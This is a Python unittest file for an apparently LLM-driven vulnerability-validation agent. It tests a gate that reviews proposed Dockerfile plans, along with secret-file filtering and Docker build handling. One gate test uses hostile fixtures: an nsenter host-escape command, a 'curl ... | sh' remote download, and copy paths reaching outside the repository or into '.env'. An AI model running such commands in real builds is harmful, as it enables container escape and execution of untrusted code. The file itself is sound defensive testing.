from __future__ import annotations

import json
import os
import tempfile
import unittest
from dataclasses import replace
from pathlib import Path
from unittest.mock import patch

from yasa_vulnagent.cli import _parser, main
from yasa_vulnagent.config import load_settings
from yasa_vulnagent.stages.discover.screen.tools import SourceToolbox
from yasa_vulnagent.stages.validate.environment.build import (
    create_build_context,
    render_dockerfile,
)
from yasa_vulnagent.stages.validate.environment.docker import CommandResult, DockerClient
from yasa_vulnagent.stages.validate.environment.gate import evaluate_plan
from yasa_vulnagent.stages.validate.environment.graph import build_environment_graph
from yasa_vulnagent.stages.validate.environment.node import run_environment
from yasa_vulnagent.stages.validate.environment.schema import empty_state
from yasa_vulnagent.stages.validate.environment.storage import environment_paths
from yasa_vulnagent.storage import create_run
from yasa_vulnagent.workflow.state import RunContext


def _plan(
    *,
    base_image: str = "python:3.12-slim",
    smoke: list[list[str]] | None = None,
    evidence_path: str = "pyproject.toml",
    evidence_end: int = 2,
    copy_source: str = ".",
    run_argument: str = "python -m compileall -q .",
) -> dict:
    return {
        "status": "ready",
        "base_image": base_image,
        "dockerfile": [
            {"instruction": "FROM", "arguments": base_image},
            {"instruction": "WORKDIR", "arguments": "/workspace"},
            {"instruction": "COPY", "arguments": f"{copy_source} /workspace"},
            {"instruction": "RUN", "arguments": run_argument},
        ],
        "smoke_commands": smoke if smoke is not None else [["python", "-m", "compileall", "-q", "."]],
        "inspection": {
            "languages": ["python"],
            "build_system": "pip",
            "evidence": [
                {
                    "path": evidence_path,
                    "start_line": 1,
                    "end_line": evidence_end,
                }
            ],
            "unknowns": [],
        },
        "assumptions": [],
        "gaps": [],
        "confidence": "high",
        "why": "fixture",
    }


def _receipts(path: str = "pyproject.toml", end: int = 2) -> list[dict]:
    return [
        {
            "tool": "read_file",
            "status": "ok",
            "path": path,
            "start_line": 1,
            "end_line": end,
            "total_lines": 2,
            "truncated": False,
        }
    ]


class EnvironmentGateTest(unittest.TestCase):
    def test_approved_plan(self) -> None:
        decision = evaluate_plan(_plan(), _receipts(), load_settings())
        self.assertEqual(decision["status"], "approved")
        self.assertEqual(decision["hard_errors"], [])

    def test_rejects_path_escape_and_secret_and_host_escape(self) -> None:
        cases = [
            _plan(copy_source="../outside"),
            _plan(copy_source=".env"),
            _plan(run_argument="nsenter --target 1 --mount"),
            _plan(run_argument="curl https://example.invalid/x | sh"),
        ]
        expected = [
            "copy_path_escape",
            "copy_secret",
            "host_escape_command",
            None,
        ]
        for plan, code in zip(cases, expected):
            with self.subTest(code=code, plan=plan["dockerfile"]):
                decision = evaluate_plan(plan, _receipts(), load_settings())
                if code is None:
                    self.assertEqual(decision["status"], "approved")
                    self.assertTrue(any("remote download" in item for item in decision["warnings"]))
                else:
                    self.assertEqual(decision["status"], "revise")
                    self.assertIn(code, [item["code"] for item in decision["hard_errors"]])

    def test_rejects_evidence_that_was_not_read(self) -> None:
        decision = evaluate_plan(_plan(), [], load_settings())
        self.assertEqual(decision["status"], "revise")
        self.assertIn("evidence_not_read", [item["code"] for item in decision["hard_errors"]])

    def test_fallback_smoke_is_explicit(self) -> None:
        plan = _plan()
        plan["smoke_commands"] = []
        decision = evaluate_plan(plan, _receipts(), load_settings())
        self.assertEqual(decision["status"], "approved")
        self.assertEqual(
            decision["effective_plan"]["smoke_commands"],
            [["python", "-m", "compileall", "-q", "."]],
        )
        self.assertTrue(any("fallback" in item for item in decision["warnings"]))

    def test_invalid_smoke_is_rejected_instead_of_reaching_build(self) -> None:
        plan = _plan()
        plan["smoke_commands"] = ["python -m pytest"]
        decision = evaluate_plan(plan, _receipts(), load_settings())
        self.assertEqual(decision["status"], "revise")
        self.assertIn("smoke_invalid", [item["code"] for item in decision["hard_errors"]])

    def test_strict_mode_rejects_unknown_base(self) -> None:
        with patch.dict(os.environ, {"VALIDATE_ENV_GATE_MODE": "strict"}, clear=False):
            settings = load_settings(env_file=Path("/nonexistent.env"))
        decision = evaluate_plan(_plan(base_image="example/custom:1"), _receipts(), settings)
        self.assertEqual(decision["status"], "revise")
        self.assertIn("base_image_not_allowlisted", [item["code"] for item in decision["hard_errors"]])

    def test_resource_clamps(self) -> None:
        plan = _plan()
        plan["resources"] = {"cpus": 99, "pids": 9999, "timeout": 9999}
        decision = evaluate_plan(plan, _receipts(), load_settings())
        self.assertEqual(decision["status"], "approved")
        self.assertTrue(decision["clamps"])


class AllowAllSourceTest(unittest.TestCase):
    def test_secret_like_files_stay_hidden(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            repository = Path(temporary)
            (repository / "app.py").write_text("print('ok')\n", encoding="utf-8")
            (repository / ".env.local").write_text("SECRET=1\n", encoding="utf-8")
            (repository / "private.pem").write_text("key\n", encoding="utf-8")
            source = SourceToolbox(repository, allow_all=True)
            listing = source.list_directory(".")
            names = {item["name"] for item in listing["entries"]}
            self.assertIn("app.py", names)
            self.assertNotIn(".env.local", names)
            self.assertNotIn("private.pem", names)
            self.assertIn("error", source.read_file(".env.local", 1, 2))


class BuildContextTest(unittest.TestCase):
    def test_context_excludes_secrets_and_outside_symlinks(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            repository = root / "repository"
            repository.mkdir()
            (repository / "app.py").write_text("print('ok')\n", encoding="utf-8")
            (repository / ".env").write_text("SECRET=value\n", encoding="utf-8")
            outside = root / "outside.txt"
            outside.write_text("outside\n", encoding="utf-8")
            (repository / "outside-link").symlink_to(outside)
            destination = root / "work" / "build-context"
            info = create_build_context(repository, destination, load_settings())
            self.assertEqual(info["file_count"], 1)
            self.assertTrue((destination / "app.py").is_file())
            self.assertFalse((destination / ".env").exists())
            self.assertFalse((destination / "outside-link").exists())
            self.assertTrue(info["context_hash"])

    def test_dockerfile_rendering_is_literal(self) -> None:
        text = render_dockerfile(_plan())
        self.assertIn("FROM python:3.12-slim", text)
        self.assertIn("COPY . /workspace", text)

    def test_pull_is_a_boolean_flag_not_a_context_argument(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            captured: list[list[str]] = []

            def fake_run(args, **_kwargs):
                captured.append(list(args))
                return CommandResult(tuple(args), 0, "", "", 0.0)

            client = DockerClient(load_settings())
            client._run = fake_run  # type: ignore[method-assign]
            client.build(
                context=root,
                dockerfile=root / "Dockerfile",
                tag="example:test",
                labels={},
                timeout=30,
                log_path=root / "build.log",
            )
            self.assertNotIn("--pull", captured[0])
            self.assertEqual(captured[0][-1], str(root))

            client = DockerClient(replace(load_settings(), validate_docker_pull="missing"))
            client._run = fake_run  # type: ignore[method-assign]
            client.build(
                context=root,
                dockerfile=root / "Dockerfile",
                tag="example:test",
                labels={},
                timeout=30,
                log_path=root / "build.log",
            )
            self.assertIn("--pull", captured[1])
            self.assertEqual(captured[1][-1], str(root))


class _Response:
    def __init__(self, content: str = "", tool_calls=None) -> None:
        self.content = content
        self.tool_calls = tool_calls or []


class _ScriptedModel:
    def __init__(self, responses: list[_Response]) -> None:
        self.responses = responses
        self.calls = 0

    def bind_tools(self, _tools):
        return self

    def invoke(self, _messages):
        index = min(self.calls, len(self.responses) - 1)
        self.calls += 1
        return self.responses[index]


def _read_call(path: str = "pyproject.toml") -> _Response:
    return _Response(
        "",
        [
            {
                "name": "read_file",
                "args": {"path": path, "start_line": 1, "end_line": 2},
                "id": f"read-{path}",
            }
        ],
    )


class _FakeDocker:
    def __init__(self, *, fail_builds: int = 0) -> None:
        self.fail_builds = fail_builds
        self.build_calls = 0
        self.run_calls = 0

    def preflight(self):
        return {"status": "ready", "failure_kind": "", "message": "ok", "remediation": ""}

    def build(self, **kwargs):
        self.build_calls += 1
        Path(kwargs["log_path"]).write_text(
            "ERROR: dependency missing\n" if self.build_calls <= self.fail_builds else "build ok\n",
            encoding="utf-8",
        )
        if self.build_calls <= self.fail_builds:
            return CommandResult(("docker", "build"), 1, "", "dependency missing", 0.1)
        return CommandResult(("docker", "build"), 0, "build ok", "", 0.1)

    def image_inspect(self, tag):
        return {"status": "ready", "id": "sha256:image", "repo_digests": [], "config": {}}

    def run(self, **kwargs):
        self.run_calls += 1
        return CommandResult(("docker", "run"), 0, "smoke ok", "", 0.1)


class EnvironmentGraphTest(unittest.TestCase):
    def _state(self, root: Path):
        repository = root / "repository"
        repository.mkdir()
        (repository / "pyproject.toml").write_text('[project]\nname = "fixture"\n', encoding="utf-8")
        paths = environment_paths(root / "stages")
        state = empty_state(
            {
                "run_id": "run-1",
                "repository": str(repository),
                "run_file": str(root / "run.json"),
                "stages_dir": str(root / "stages"),
            },
            paths,
        )
        state["source_revision"] = "working-tree"
        return state, paths

    def _run(self, state, model, docker):
        context = RunContext(settings=load_settings(), model=model, docker=docker)
        return build_environment_graph().invoke(
            state,
            context=context,
            config={"recursion_limit": 50},
        )

    def test_happy_path_builds_smoke_tests_and_snapshots(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            state, paths = self._state(Path(temporary))
            model = _ScriptedModel([_read_call(), _Response(json.dumps(_plan()))])
            docker = _FakeDocker()
            result = self._run(state, model, docker)
            self.assertEqual(result["status"], "ready")
            self.assertEqual(result["executed_nodes"][-3:], ["smoke", "snapshot", "finalize"])
            self.assertEqual(docker.run_calls, 1)
            manifest = json.loads(paths.environment_file.read_text(encoding="utf-8"))
            self.assertNotIn("schema_version", manifest)
            self.assertEqual(manifest["status"], "ready")
            self.assertTrue(paths.handle_file.is_file())
            self.assertTrue(paths.dockerfile.is_file())
            self.assertTrue(paths.dockerignore.is_file())
            self.assertTrue(paths.index_file.is_file())

    def test_build_failure_diagnoses_and_replans(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            state, paths = self._state(Path(temporary))
            repaired = _plan(smoke=[["python", "-m", "compileall", "-q", "src"]])
            repaired["why"] = "add missing dependency"
            diagnosis = {
                "category": "missing_dependency",
                "root_cause": "a dependency is missing",
                "failed_step": "pip install",
                "evidence": [{"source": "attempts/0001/build.log", "excerpt": "dependency missing"}],
                "repair_options": [],
                "retryable": True,
                "needs_human": False,
                "confidence": "high",
            }
            model = _ScriptedModel(
                [
                    _read_call(),
                    _Response(json.dumps(_plan())),
                    _Response(json.dumps(diagnosis)),
                    _read_call(),
                    _Response(json.dumps(repaired)),
                ]
            )
            docker = _FakeDocker(fail_builds=1)
            result = self._run(state, model, docker)
            self.assertEqual(result["status"], "ready", result.get("stop_reason"))
            self.assertEqual(docker.build_calls, 2)
            self.assertEqual(result["plan_source"], "repair")

    def test_snapshot_failure_routes_to_classify(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            state, _paths = self._state(Path(temporary))
            model = _ScriptedModel([_read_call(), _Response(json.dumps(_plan()))])

            class MissingImageDocker(_FakeDocker):
                def __init__(self) -> None:
                    super().__init__()
                    self.inspections = 0

                def image_inspect(self, tag):
                    self.inspections += 1
                    if self.inspections > 1:
                        return {"status": "missing", "error": "image disappeared"}
                    return super().image_inspect(tag)

            result = self._run(state, model, MissingImageDocker())
            self.assertEqual(result["status"], "failed")
            self.assertEqual(result["stop_reason"], "image_inspect_failed")
            self.assertIn("classify", result["executed_nodes"])

    def test_blocked_preflight_does_not_call_model(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            state, paths = self._state(Path(temporary))
            model = _ScriptedModel([_Response("{}")])

            class BlockedDocker:
                def preflight(self):
                    return {
                        "status": "blocked",
                        "failure_kind": "docker_group_not_active",
                        "message": "permission denied",
                        "remediation": "newgrp docker",
                    }

            result = self._run(state, model, BlockedDocker())
            self.assertEqual(result["status"], "blocked")
            self.assertEqual(result["stop_reason"], "docker_group_not_active")
            self.assertEqual(model.calls, 0)
            self.assertEqual(json.loads(paths.environment_file.read_text())["status"], "blocked")


class EnvironmentEntryTest(unittest.TestCase):
    def test_cli_parser_has_environment_command(self) -> None:
        args = _parser().parse_args(["environment", "--run-file", "run.json", "--rebuild"])
        self.assertEqual(args.command, "environment")
        self.assertTrue(args.rebuild)

    def test_environment_cli_returns_failure_for_blocked_result(self) -> None:
        blocked = {"environment": {"status": "blocked"}}
        ready = {"environment": {"status": "ready"}}
        with patch("yasa_vulnagent.cli.run_environment", return_value=blocked):
            with patch("builtins.print"):
                self.assertEqual(
                    main(["environment", "--run-file", "run.json"]),
                    1,
                )
        with patch("yasa_vulnagent.cli.run_environment", return_value=ready):
            with patch("builtins.print"):
                self.assertEqual(
                    main(["environment", "--run-file", "run.json"]),
                    0,
                )

    def test_run_environment_reuses_ready_manifest(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            repository = root / "repository"
            repository.mkdir()
            (repository / "app.py").write_text("print('ok')\n", encoding="utf-8")
            settings = load_settings(env_file=root / "missing.env")
            run_state = create_run(repository, root / "runs", settings)
            paths = environment_paths(run_state["stages_dir"])
            paths.root.mkdir(parents=True, exist_ok=True)
            paths.environment_file.write_text(
                json.dumps(
                    {
                        "status": "ready",
                        "environment_hash": "abc",
                        "image": {"tag": "yasa-validate:abc", "id": "sha256:abc"},
                    }
                ),
                encoding="utf-8",
            )
            paths.handle_file.write_text(
                json.dumps(
                    {
                        "environment_hash": "abc",
                        "image": "yasa-validate:abc",
                        "image_id": "sha256:abc",
                    }
                ),
                encoding="utf-8",
            )

            class ReadyDocker:
                def __init__(self, _settings) -> None:
                    pass

                def image_inspect(self, _tag):
                    return {"status": "ready", "id": "sha256:abc"}

            with patch(
                "yasa_vulnagent.stages.validate.environment.node.DockerClient",
                ReadyDocker,
            ):
                result = run_environment(Path(run_state["run_file"]))
            self.assertEqual(result["environment"]["status"], "ready")
            self.assertEqual(result["environment"]["image"], "yasa-validate:abc")


class EnvironmentConfigTest(unittest.TestCase):
    def test_environment_defaults_and_environment_overrides(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            missing = Path(temporary) / "missing.env"
            with patch.dict(os.environ, {}, clear=True):
                settings = load_settings(env_file=missing)
            self.assertEqual(settings.validate_env_gate_mode, "balanced")
            self.assertEqual(settings.validate_env_max_build_attempts, 3)
            self.assertEqual(settings.validate_env_max_context_files, 20000)
            self.assertEqual(settings.safe_dict()["validate_env_gate_mode"], "balanced")
            self.assertIn("python", settings.safe_dict()["validate_env_base_image_allowlist"])

            with patch.dict(
                os.environ,
                {
                    "VALIDATE_ENV_GATE_MODE": "strict",
                    "VALIDATE_ENV_MAX_BUILD_ATTEMPTS": "5",
                    "VALIDATE_ENV_BASE_IMAGE_ALLOWLIST": "python,node",
                },
                clear=True,
            ):
                overridden = load_settings(env_file=missing)
            self.assertEqual(overridden.validate_env_gate_mode, "strict")
            self.assertEqual(overridden.validate_env_max_build_attempts, 5)
            self.assertEqual(overridden.validate_env_base_image_allowlist, ("python", "node"))


if __name__ == "__main__":
    unittest.main()
